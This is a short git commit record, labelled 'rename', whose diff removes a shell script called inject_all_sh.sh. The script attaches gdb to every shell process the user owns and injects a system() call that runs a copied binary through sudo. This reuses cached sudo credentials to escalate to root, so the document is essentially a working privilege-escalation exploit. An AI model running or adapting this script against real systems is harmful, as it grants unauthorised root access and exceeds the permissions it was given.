933f46023f2ede3283c2c5d1b77ecf13efe422f9
root <root@localhost.localdomain>
2019-03-24 23:41:54 +0100

    rename

--- inject_all_sh.sh
+++
@@ -1,5 +0,0 @@
-cp activate_sudo_token /tmp
-for pid in $(pgrep '^(ash|ksh|cshdash|bash|zsh|tcsh|sh)$' -u "$EUID" | grep -v "^$$\$")
-do
-	gdb -q -p "$pid" <<< $'call system("echo | sudo -S /tmp/activate_sudo_token")'
-done
